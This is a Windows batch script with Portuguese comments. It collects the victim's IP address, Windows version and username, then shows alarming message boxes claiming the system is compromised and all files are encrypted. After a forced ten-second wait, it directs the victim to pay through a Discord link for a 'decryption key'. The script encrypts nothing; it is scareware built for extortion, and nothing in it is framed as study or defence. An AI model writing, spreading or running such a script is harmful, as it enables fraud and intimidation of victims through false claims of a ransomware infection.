@echo off
title ⚠️ SISTEMA COMPROMETIDO ⚠️
color 4f
cls

:: --- COLETA DE INFORMAÇÕES ---
:: Pega o IP
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4"') do set IP=%%a
:: Limpa espaços do IP
for /f "tokens=1 delims= " %%b in ("%IP%") do set IP=%%b

:: Pega o Modelo/Edição do Windows
wmic os get Caption /value | findstr "=" | for /f "tokens=2 delims==" %%i in ('wmic os get Caption /value') do set WINMODEL=%%i

:: Pega o Usuário
set USUARIO=%USERNAME%

:: --- MONTA A MENSAGEM 1 ---
set MSG1=╔══════════════════════════════════════════════════════════╗
set MSG2=║                  ⚠️  SISTEMA COMPROMETIDO  ⚠️           ║
set MSG3=╚══════════════════════════════════════════════════════════╝
set MSG4=
set MSG5=📡 DADOS DO SISTEMA COMPROMETIDO:
set MSG6=• Usuário: %USUARIO%
set MSG7=• IP Local: %IP%
set MSG8=• SO: %WINMODEL%
set MSG9=
set MSG10=🔒 SEUS ARQUIVOS FORAM CIFRADOS!
set MSG11=Todas as suas fotos, documentos e senhas foram acessados.

:: --- EXIBE JANELA 1 (MSGBOX NATIVO DO WINDOWS) ---
:: Usa PowerShell para uma janela gráfica bonita
powershell -NoProfile -Command "
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
'''$MSG1$MSG2$MSG3$MSG4$MSG5$MSG6$MSG7$MSG8$MSG9$MSG10$MSG11''', 
'⚠️ VOCÊ FOI HACKEADO ⚠️', 'OK', 'Critical')
"

:: --- AGUARDA 10 SEGUNDOS ---
:: O /t 10 espera 10 segundos. /nobreak impede que o usuário pule a espera.
echo Aguardando decodificação forçada...
timeout /t 10 /nobreak >nul

:: --- EXIBE JANELA 2 (MENSAGEM DE PAGAMENTO) ---
powershell -NoProfile -Command "
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
'Para salvar seu pc pague no canal pague do nosso discord em:

https://discord.gg/spDuk2mwcp

Após o pagamento, você receberá a chave de decodificação.
Não reinicie seu computador.', 
'💰 COMO SALVAR SEU PC', 'OK', 'Warning')
"

:: --- FECHA O SCRIPT ---
exit
